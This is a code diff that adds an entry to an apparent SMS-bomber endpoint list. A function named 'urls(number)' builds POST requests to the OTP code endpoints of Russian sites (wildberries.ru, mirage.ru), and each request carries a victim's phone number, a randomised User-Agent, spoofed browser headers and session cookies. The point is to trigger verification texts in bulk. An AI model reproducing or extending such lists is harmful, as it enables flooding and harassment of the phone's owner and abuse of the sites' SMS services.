@@ -9,6 +9,14 @@ def urls(number):
         {
             "info": {"type": "sms"},
             "method": "post",
+            "url": "https://finance.wildberries.ru/api/auth-core/auth/otp/code/deprecated",
+            "headers": {'User-Agent': ua.random,'Accept': '*/*','Accept-Language': 'en-US,en;q=0.5','Referer': 'https://www.wildberries.ru/lk','client-code': 'individual','content-type': 'application/json','deviceid': 'site_7676e74a982a478e862122826d934fb3','x-correlation-id': 'b59b2591fefa4bb18d24c8fc7350dbdf','Origin': 'https://www.wildberries.ru','Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site',},
+            "cookies": {'wbx-validation-key': 'a857a843-2009-4a05-9815-fde8519d86e5',},
+            "json": {'phone_number': number,'captcha_token': '','public_key': 'UG2OS3upXkmYuvzFcsYtS4KyK5knMBem1isZDpcr+AI=',},
+        },
+        {
+            "info": {"type": "sms"},
+            "method": "post",
             "url": "https://www.mirage.ru/login2/1/",
             "headers": { 'User-Agent': ua.random, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.mirage.ru', 'Referer': 'https://www.mirage.ru/login3/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', },
             "cookies": { 'PHPSESSID': '49g7vvvgp2djfnu1udn2o798ef', },
